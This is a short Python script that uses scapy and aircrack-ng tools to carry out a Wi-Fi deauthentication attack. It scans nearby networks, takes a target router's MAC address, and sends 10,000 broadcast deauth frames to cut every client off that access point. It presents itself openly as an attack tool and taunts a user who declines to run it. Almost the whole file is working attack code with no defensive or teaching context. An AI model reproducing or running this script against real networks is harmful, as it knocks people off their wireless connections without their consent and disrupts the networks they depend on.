#!/usr/bin/env python

# imports that won't cause errors
import sys
from scapy.all import *
import os


def DeautAttack():
# run a shell command "airmon-ng"
    subprocess.call('airmon-ng', shell=True)
#subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)
#subprocess.call('airmon-ng check kill', shell=True)


# receive a networkcard
    networkCard = raw_input('Please enter the name of the network card you wish to use: ')
    print('Now scanning for available networks, press ctrl+c to exit the scan')

# scaning the mac address in the network
    air = "bash -c \"sudo airodump-ng \"" + networkCard
    os.system(air)

# brdMac is the broadcast macaddress variable
    brdMac = 'ff:ff:ff:ff:ff:ff'

# receive a mac address which we want to attack
# Let the user input the MAC address of the router
    BSSID = raw_input('Please enter the MAC address : ')
    print('Sending deauth packets now, press ctrl+c to end the attack')

# creating a malicious packet
    pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()

# sending the packet to the mac address which we want to attack
    sendp(pkt, iface=networkCard, count=10000, inter=.2)

def main():
    ready = int(input("Are you ready to attack wi-fi Networks ? Press 1 , if are you afraid Press 0 : "))
    if ready == 1:
        DeautAttack()
    else:
        print("coward")
        sys.exit(0)
main()
